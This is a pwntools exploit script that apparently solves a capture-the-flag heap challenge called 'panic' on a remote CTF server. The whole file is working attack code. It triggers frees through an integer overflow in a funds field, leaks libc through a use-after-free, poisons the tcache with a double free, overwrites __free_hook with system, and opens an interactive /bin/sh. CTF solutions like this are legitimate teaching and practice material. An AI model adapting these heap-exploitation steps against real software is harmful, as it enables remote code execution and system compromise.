from pwn import *
import solver_data

def pop_id(bins, b):
    return bins[b].pop(0).encode("ascii")

libc = ELF('./bins/libc-2.31.so')
# context.binary = ELF('./target/debug/panic')
context.binary = ELF('./bins/panic')

while True:
    # with process() as p:
    with remote("pwn.chall.pwnoh.io", 13381) as p:
        eight = solver_data.eight()
        foureight = solver_data.foureight()
        sixfour = solver_data.sixfour()
        onetwoeight = solver_data.onetwoeight()

        try:
            def new_acct(id, name):
                p.sendline(b'3')
                p.sendline(id)
                p.sendline(name)

            def free_in_x_funds(id, num):
                p.sendline(b'2')
                p.sendline(id)
                p.sendline(str(-9223372036854775800 + 1000 * (num - 1)).encode('ascii'))

            def run_funds():
                p.sendline(b'4')

            def get_balance(id):
                p.sendline(b'1')
                p.clean()
                p.sendline(id)
                p.readuntil(b"Account ")
                b = p.readuntil(b": You owe ")
                return b

            num_fill_tcache = 5 # 5 x 128 bytes + 5 x 64 bytes
            for i in range(num_fill_tcache):
                t = pop_id(sixfour, 14)
                new_acct(t, b'A' * 128)
                free_in_x_funds(t, i + 1)
                p.clean()

            # 1 x 128 bytes
            t1 = pop_id(onetwoeight, 14)
            new_acct(t1, b'')
            free_in_x_funds(t1, num_fill_tcache + 1)
            num_fill_tcache = num_fill_tcache + 1
            p.clean()

            # 64 bit string calculated that replacing the first 8 bytes
            # with \u{0} won't change the hash
            first_uaf = b"0000000033100000000000000000000000000000000000000000000000000000" # bin 13
            new_acct(first_uaf, b'A' * 128)
            free_in_x_funds(first_uaf, num_fill_tcache + 1)
            p.clean()

            for i in range(num_fill_tcache + 1):
                run_funds()
                p.clean()

            # this only gets the name, we don't care
            # about our debt, just like
            addr = get_balance(b'\x00' * 8 + first_uaf[8:])[:8]
            p.clean()
            heap_ptr = u64(addr)
            print(f"Leaked unsorted bin {heap_ptr}")
            libc_base = heap_ptr - 0x1ebbe0 # determined through experimentation
            print(f"Leaked libc base {heap_ptr}")

            # we don't care about the 6 x 8 bytes
            # 6 x 48 bytes to fill
            num_tcache_again = 6
            for i in range(num_tcache_again):
                t = pop_id(eight, 12)
                new_acct(t, b'A' * 48)
                free_in_x_funds(t, i + 1)
                p.clean()

            # this one will be freed twice
            # 1 x 48 bytes
            bad_chunk = pop_id(foureight, 11)
            new_acct(bad_chunk, b'')
            free_in_x_funds(bad_chunk, num_tcache_again + 1)
            p.clean()

            for i in range(num_tcache_again + 1):
                run_funds()
                p.clean()


            for i in range(6):
                t = pop_id(foureight, 1)
                new_acct(t, b'')
                p.clean()

            bypass_trim = pop_id(foureight, 1).ljust(128, b' ')
            # trim technique to only allocate once in bin
            new_acct(bypass_trim, b'')
            p.clean()

            # we still need to free bad_chunk once more,
            # so it goes to the tcache and not the fastbin
            run_funds()
            p.clean()

            free_hook = libc_base + libc.sym.__free_hook
            # write 16 bytes backwards as fastbins
            # reserve 16 bytes for internal metadata
            # this allocates ... ughhh
            try_free = p64(free_hook - 16).ljust(48, b'A') + b' ' * 128
            new_acct(try_free, b'')
            err = p.readline()
            if b"Could not" in err:
                print("Restarting due to UTF-8 decode failure")
                continue
            p.clean()

            test = pop_id(foureight, 1) + b' ' * 128
            new_acct(test, b'')
            p.clean()

            system = libc_base + libc.sym.system
            try_system = p64(system).ljust(48, b'A')
            # UTF-8 decode error here still lets
            # us pwn, so don't care about it
            # ditto for double allocation, I think
            # it actually helps us? idk its black magic
            new_acct(try_system, b'')
            p.clean()

            print("1, and then /bin/sh")
            p.interactive()

            break
        except EOFError:
            print(f"Continuing, due to EOFError")
        except KeyboardInterrupt:
            break
